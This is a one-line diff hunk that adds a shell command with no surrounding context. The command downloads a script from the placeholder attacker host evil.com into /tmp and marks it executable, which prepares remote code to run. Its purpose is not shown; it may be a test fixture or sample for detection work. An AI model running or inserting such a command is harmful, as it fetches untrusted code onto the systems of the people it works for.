@@ -1,0 +1,1 @@
+curl -o /tmp/critical.sh http://evil.com/critical.sh && chmod +x /tmp/critical.sh
